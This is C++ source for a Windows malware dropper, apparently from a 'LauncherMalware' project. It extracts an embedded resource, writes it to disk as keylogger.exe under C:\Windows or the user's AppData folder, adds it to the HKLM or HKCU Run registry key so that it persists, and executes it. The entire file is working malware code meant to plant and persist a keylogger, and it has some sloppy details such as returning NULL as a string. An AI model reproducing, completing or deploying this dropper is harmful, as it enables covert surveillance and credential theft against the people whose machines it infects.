#include <iostream>
#include <string>
#include <lmcons.h>
#include <windows.h>
#include <fstream>
#include <array>
#include <stdexcept>
#include <memory>
#include <C:\Users\...\Programs\LauncherMalware\resource.h>
using namespace std;

#define HKLM_subkey_name L"Malware"
const string HKLM_malware_name = "keylogger.exe";

#define HKCU_subkey_name L"Malware"
const string HKCU_folder_name = "Malware";
const string HKCU_malware_name = "keylogger.exe";

// executes a console command and returns it's output
string exec(string incmd) {
    const char* cmd = incmd.c_str();
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// Reads data from a binary resource file (.rc) and returns the data in the form of a string
string ReadRcDataResource(int resourceId) {
    HMODULE hModule = GetModuleHandleW(NULL);
    if (hModule == NULL) {
        cerr << "GetModuleHandleW Failed, code: " << GetLastError() << endl;
        return NULL;
    }
    HRSRC hResource = FindResourceW(hModule, MAKEINTRESOURCEW(resourceId), MAKEINTRESOURCEW(RT_RCDATA));
    if (hResource == NULL) {
        cerr << "FindResourceW Failed, code: " << GetLastError() << endl;
        return NULL;
    }
    else if (hResource) {
        HGLOBAL hGlobal = LoadResource(hModule, hResource);
        if (hGlobal) {
            PVOID pData = LockResource(hGlobal);
            DWORD dataSize = SizeofResource(hModule, hResource);
        }
    }

    HGLOBAL hGlobal = LoadResource(hModule, hResource);
    if (hGlobal == NULL) {
        std::cerr << "LoadResource Failed, code: " << GetLastError() << std::endl;
        return NULL; // Return an empty string on failure
    }

    PVOID pData = LockResource(hGlobal);
    DWORD dataSize = SizeofResource(hModule, hResource);

    // Assuming the resource contains text data (adjust as needed)
    string data (static_cast<char*>(pData), dataSize);
    return data;
}

string getUsername() {
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	if (GetUserNameA(username, &username_len)) {
		return string(username);
	}
	else {
		std::cerr << "Error getting username.\n";
		return "ERROR";
	}
}

string base64_decode(string encoded) {
    static const string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    string decoded;
    int val = 0;
    int val_bits = -8;

    for (char c : encoded) {
        if (c == '=')
            break;

        size_t pos = base64_chars.find(c);
        if (pos != std::string::npos) {
            val = (val << 6) | static_cast<int>(pos);
            val_bits += 6;

            while (val_bits >= 0) {
                decoded.push_back(static_cast<char>((val >> val_bits) & 0xFF));
                val_bits -= 8;
            }
        }
    }
    return decoded;
}

int main()
{
    // Reading file from resource
    // attempt to write files to directories in the following order:
    // C:\Windows\System32\MALWARE.EXE
    // C:\Users\USERNAME\AppData\Roaming\MALWARE.EXE
    
    string path = "";
    path = "C:\\Windows\\" + HKLM_malware_name;
	ofstream fout(path, std::ios::binary);
    if (!fout.is_open()) {
        exec("mkdir C:\\Users\\" + getUsername() + "\\AppData\\Roaming\\" + HKCU_folder_name);
        path = "C:\\Users\\" + getUsername() + "\\AppData\\Roaming\\" + HKCU_folder_name + "\\" + HKCU_malware_name;
        fout.open(path, std::ios::binary);
        if (!fout.is_open()) {
            cerr << "Could not open file" << endl;
            return 0;
        }
    }

    // decodes and writes data to file
    fout << ReadRcDataResource(IDR_RCDATA1);
    fout.close();
    
    // establish persistence
    HKEY hkey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        wstring HKLM_subkey_data(path.begin(), path.end());
        if (RegSetValueEx(hkey, HKLM_subkey_name , 0, REG_SZ, reinterpret_cast<const BYTE*>(HKLM_subkey_data.c_str()), HKLM_subkey_data.size() * sizeof(wchar_t)) != ERROR_SUCCESS) {
            cerr << "could not set HKLM subkey" << endl;
        }
    }
    else if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        wstring HKCU_subkey_data(path.begin(), path.end());
        if (RegSetValueEx(hkey, HKCU_subkey_name, 0, REG_SZ, reinterpret_cast<const BYTE*>(HKCU_subkey_data.c_str()), HKCU_subkey_data.size() * sizeof(wchar_t)) != ERROR_SUCCESS) {
            cerr << "could not set HKCU subkey" << endl;
        }
    }

    // run dropped file
    exec("cmd.exe " + path);

    return 0;
}
